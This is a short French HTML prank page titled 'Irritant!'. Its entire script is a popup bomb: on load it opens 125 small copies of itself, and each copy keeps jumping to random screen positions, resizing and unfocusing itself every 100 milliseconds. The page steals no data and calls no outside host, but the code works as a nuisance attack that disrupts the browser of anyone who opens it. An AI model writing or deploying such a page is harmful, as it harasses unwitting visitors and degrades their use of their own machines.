<!DOCTYPE html>

<html lang="fr">

<head>
    <meta charset="utf-8">
    <title>Irritant! (0)</title>
    <script type="text/javascript">
        const times = 125;
        const w = 200;
        const h = 120;

    </script>
    <link rel="icon" href="favicon.ico">
</head>

<body>
    <img src="favicon.ico" alt=":-)">
    Irritant h√©...?
    <script type="text/javascript">

        try {
            if (window.location.href.indexOf("?d=") == -1) {
                for (iterrator = 0; iterrator < times; iterrator++) {
                    window.open(window.location.href + "?d=" + iterrator, "_blank", "fullscreen=no,toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,width=" + w + ",height=" + h);
                }
            } else {
                document.getElementsByTagName("title")[0].innerText = "Irritant! (" + window.location.href.match("(\\d+)")[0] + ")";

            }
        } catch (e) {

        }
        window.onfocus = move;
        window.onload = move;

        function move() {
            var l = Math.floor(Math.random() * screen.width);
            var t = Math.floor(Math.random() * screen.height);
            window.moveTo(l, t);
            window.resizeTo(w, h);
            window.blur();
            setTimeout(move, 100);
        }

    </script>
</body>
